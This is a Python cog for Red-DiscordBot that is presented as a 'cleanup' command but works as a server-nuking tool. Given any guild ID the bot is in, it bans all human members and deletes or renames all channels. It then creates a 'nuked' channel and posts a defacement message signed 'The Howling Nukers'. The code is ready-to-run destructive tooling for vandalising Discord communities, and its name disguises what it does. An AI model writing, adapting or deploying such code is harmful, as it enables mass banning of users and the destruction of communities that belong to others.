import discord
from redbot.core import commands

class CleanupGuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.guild_only()
    @commands.is_owner()
    async def cleanupguild(self, ctx, guild_id: int, ban_users: bool):
        """
        Cleanup the specified guild by:
        1. Banning all users (if ban_users is True)
        2. Removing all channels and categories
        3. Adding one category and channel with the default names
        4. Sending a cleanup message in the new channel
        """
        guild = self.bot.get_guild(guild_id)
        if not guild:
            await ctx.send("Guild not found.")
            return

        bot_user = guild.get_member(self.bot.user.id)

        if ban_users:
            # Ban all users (excluding bots) and log the actions
            for member in guild.members:
                if member != bot_user and not member.bot:
                    try:
                        await member.ban(reason="CleanupGuild command")
                        await ctx.send(f"Banned user: {member.display_name}")
                    except discord.errors.Forbidden:
                        continue  # Continue to the next user if missing permissions

        renamed_channels = 0

        # Remove all channels and categories and log the actions
        for channel in guild.channels:
            if isinstance(channel, discord.CategoryChannel):
                continue  # Skip categories
            try:
                await channel.delete()
                renamed_channels += 1
                await ctx.send(f"Deleted channel: {channel.name}")
            except discord.errors.Forbidden:
                # If deleting is not possible, rename the channel
                try:
                    await channel.edit(name="general")
                    await ctx.send(f"Renamed channel: {channel.name} to general")
                except discord.errors.Forbidden:
                    await ctx.send(f"Skipped channel: {channel.name} (no delete/rename permissions)")
                    continue  # Skip this channel, as it can't be renamed or deleted

        # Add one category with the specified name
        category = await guild.create_category("Howling nukers")
        await ctx.send(f"Created category: {category.name}")

        # Add one text channel inside the category
        channel = await guild.create_text_channel("nuked", category=category)
        await ctx.send(f"Created text channel: {channel.name}")

        # Send a cleanup message in the new channel
        await channel.send("Server nuked by The Howling Nukers. **Awoooooooo**")

        # Output message detailing the actions
        output_message = (
            f"Renamed channels: **{renamed_channels}**\n"
            f"Banned users (excluding bots) if ban_users is True."
        )

        await ctx.send(output_message)

def setup(bot):
    bot.add_cog(CleanupGuild(bot))
